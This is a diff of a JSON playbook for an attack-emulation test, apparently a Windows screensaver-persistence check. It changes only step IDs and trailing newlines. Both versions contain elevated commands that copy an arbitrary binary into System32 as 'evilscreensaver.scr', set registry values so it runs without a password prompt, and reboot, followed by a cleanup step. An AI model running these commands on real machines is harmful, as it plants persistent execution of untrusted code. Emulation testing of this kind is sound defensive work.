@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "e67366a6-47ae-471f-a596-c304930930a1",
+      "id": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
       "type": "execute-command",
       "data": {
-        "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n",
+        "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0",
         "command_type": "command_prompt"
       },
       "elevation_required": true
     },
     {
-      "id": "5b4c558e-459a-44e4-8435-c1b18e438599",
+      "id": "336693dd-2f13-4f35-bd2d-603d212d673d",
       "type": "execute-command",
       "data": {
-        "command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n",
+        "command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr",
         "command_type": "command_prompt"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "e67366a6-47ae-471f-a596-c304930930a1",
+      "s": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
       "p": "on-success",
-      "o": "5b4c558e-459a-44e4-8435-c1b18e438599"
+      "o": "336693dd-2f13-4f35-bd2d-603d212d673d"
     },
     {
-      "s": "e67366a6-47ae-471f-a596-c304930930a1",
+      "s": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
       "p": "on-failure",
-      "o": "5b4c558e-459a-44e4-8435-c1b18e438599"
+      "o": "336693dd-2f13-4f35-bd2d-603d212d673d"
     }
   ],
   "tags": [
